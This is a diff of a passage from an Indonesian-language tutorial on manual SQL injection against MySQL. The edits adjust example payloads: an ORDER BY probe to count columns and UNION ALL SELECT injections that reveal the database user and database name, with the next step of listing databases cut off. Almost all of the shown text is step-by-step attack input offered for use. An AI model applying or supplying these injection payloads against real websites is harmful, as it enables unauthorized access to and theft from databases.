@@ -3,11 +3,11 @@
 * Apabila terdapat vuln, maka masukan script Cth: ' ORDER By 2# <- Script ini berguna untuk mengetahui jumlah tables dalam database.
 * Selanjutnya jika sudah diketahui banyaknya tables, makan jalankan script berikut, Cth:
 ```bash
-UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#
+' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10 #
 ```
 * Selanjutnya, untuk mengetahui user dan nama database yang digunakan menggunakan script berikut, Cth:
 ```bash
-' UNION ALL SELECT 1,2,3,user(),5,6,7,database(),9,10#
+' UNION ALL SELECT 1,2,3,user(),5,6,7,database(),9,10 #
 ```
 
 * Selanjutnya untuk mengetahui list database yang tersimpan pada MYSQL, menggunakan script berikut, Cth:
